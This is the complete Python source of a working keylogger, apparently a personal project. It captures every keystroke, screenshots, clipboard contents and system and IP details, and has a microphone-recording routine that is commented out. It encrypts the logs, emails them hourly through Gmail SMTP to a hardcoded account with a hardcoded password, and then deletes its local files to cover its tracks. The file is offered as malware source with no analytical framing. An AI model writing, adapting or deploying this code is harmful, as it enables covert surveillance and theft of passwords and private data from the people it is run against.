# KEYLOGGING, EMAIL, CLIPBOARD, SCREENSHOT, COMPUTER INFORMATION, MIC, ENCRYPTION
# Libraries --------------------------------

# EMAIL LIBRARIES---
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
# COLLECT COMPUTER INFORMATION---
import socket
import platform
# COPYING CLIPBOARD DATA---
import pyperclip
# MICROPHONE RECORDING---
from scipy.io.wavfile import write
import sounddevice as sd
# KEYSTROKES---
from pynput.keyboard import Key, Listener
# CRYPTOGRAPHY
from cryptography.fernet import Fernet
# TRACK TIME AND OPERATING SYSTEM---
import time
import os
# USERNAME AND MORE COMPUTER INFORMATION---
import getpass
from requests import get
# SCREENSHOT---
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import subprocess

# UN-ENCRYPTED DATA
keys_data = "keylog.txt"
system_data = "system_info.txt"
clipboard_data = "clipboard.txt"
# MIC & SCREENSHOT
audio_data = "mic_recording.wav"
screenshot_data = "screenshot.png"
# ENCRYPTED DATA
keys_data_encrypted = "encrypted_keylog.txt"
system_data_encrypted = "encrypted_system_info.txt"
clipboard_data_encrypted = "encrypted_clipboard.txt"

microphone_time = 60
total_iterations = 10
time_per_iteration = 3600

email_address = "keyloggerproject0@gmail.com"
password = "pythontest"
to_address = "keyloggerproject0@gmail.com"
encryption_key = "PwgaOzW7UItVOq6-iLwwQPSvDIx1kBm3zfxm0QFTktE="

# FILE PATH TO CREATE AND ACCESS FILES
file_path = "/Users/harsh/Documents/Keylogger Project Tests/AdvancedKeyLogger/keylogger"
append = "/"
file_path_appended = file_path + append


# email controls

def send_encrypted_files(filename, attachment, to_address):
    from_address = email_address
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Advanced Key Logger Logs"

    if filename == system_data_encrypted:
        body = "This is System Information File"
    if filename == clipboard_data_encrypted:
        body = "This is Clipboard Information File"
    if filename == keys_data_encrypted:
        body = "***Here Iteration Ends*** - This is Key Log Information File"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_address, text)
    s.quit()


def send_other_files(filename, attachment, to_address):
    from_address = email_address
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Advanced Key Logger Logs"
    if filename == screenshot_data:
        body = "***Here Iteration Starts*** - This is Screenshot File"
    # if filename == audio_data:
    #    body = "This is Audio File"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_address, text)
    s.quit()


# ***CLIPBOARD, COMPUTER INFORMATION, SCREENSHOT, MICROPHONE********************************************

# get the clipboard data
def copy_clipboard():
    with open(file_path + append + clipboard_data, "a") as f:
        try:
            data = pyperclip.paste()
            pyperclip.copy(data)
            f.write("\n" + data)
        except:
            f.write("Failed to copy clipboard as user copied something other than text!")


# get the computer information
def computer_information():
    with open(file_path + append + system_data, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address of the Machine is: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Private IP Address of the Machine is: " + IPAddr + "\n")
        f.write("System is: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Processor of the Machine is: " + (platform.processor()) + '\n')
        f.write("Hostname of the Machine is: " + hostname + "\n")



# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + append + screenshot_data)


# get the mic recording
def microphone():
    fs = 44100
    seconds = microphone_time
    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1, blocking=True)
    sd.wait()
    write(file_path + append + audio_data, fs, recording)


# ***CLIPBOARD, COMPUTER INFORMATION, SCREENSHOT, MICROPHONE********************************************
# Key logging Function with Timer + Encryption

starting_iteration = 0
time_here = time.time()
stop_time = time.time() + time_per_iteration

while starting_iteration < total_iterations:
    keylog_count = 0
    keys = []
    print(starting_iteration, "Iteration Logging Starts")


    def on_press(key):
        global keys, keylog_count, time_here
        print(key)
        keys.append(key)
        keylog_count += 1

        if keylog_count >= 1:
            time_here = time.time()
            keylog_count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + append + keys_data, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("enter") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("space") > 0:
                    f.write(" ")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if time_here >= stop_time:
            print(starting_iteration, "iteration/s completed")
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

        screenshot()
        send_other_files(screenshot_data, file_path + append + screenshot_data, to_address)  # 1st EMAIL SENT
        # microphone()
        # send_email(audio_data, file_path + append + audio_data, to_address) # 2nd EMAIL SENT
        computer_information()
        copy_clipboard()

        # ***Log Keys, Clipboard, System Info are sent in Encryption Function***
        # Encryption
        unencrypted_files = [file_path_appended + system_data, file_path_appended + clipboard_data,
                             file_path_appended + keys_data]
        new_encrypted_files = [file_path_appended + system_data_encrypted,
                               file_path_appended + clipboard_data_encrypted, file_path_appended + keys_data_encrypted]
        encrypted_file_names = [system_data_encrypted, clipboard_data_encrypted, keys_data_encrypted]

        encryption_count = 0
        for encrypting_file in unencrypted_files:
            send_encryption_email = 0
            with open(unencrypted_files[encryption_count], 'rb') as f:
                data = f.read()
            fernet = Fernet(encryption_key)
            encrypted = fernet.encrypt(data)
            with open(new_encrypted_files[encryption_count], 'wb') as f:
                f.write(encrypted)
            # ~~~3+4+5th EMAIL SENT~~~
            send_encrypted_files(encrypted_file_names[encryption_count], new_encrypted_files[encryption_count],
                                 to_address)

            encryption_count += 1

        if time_here > stop_time:
            with open(file_path + append + keys_data, "w") as f:
                f.write(" ")
            with open(file_path + append + system_data, "w") as f:
                f.write(" ")
            with open(file_path + append + clipboard_data, "w") as f:
                f.write(" ")

        starting_iteration += 1
        time_here = time.time()
        stop_time = time.time() + time_per_iteration

# Deleting Tracks and Unencrypted Files
deleting_files = [system_data, keys_data, clipboard_data, screenshot_data, audio_data, keys_data_encrypted,
                  system_data_encrypted, clipboard_data_encrypted]
for file in deleting_files:
    os.remove(file_path_appended + file)
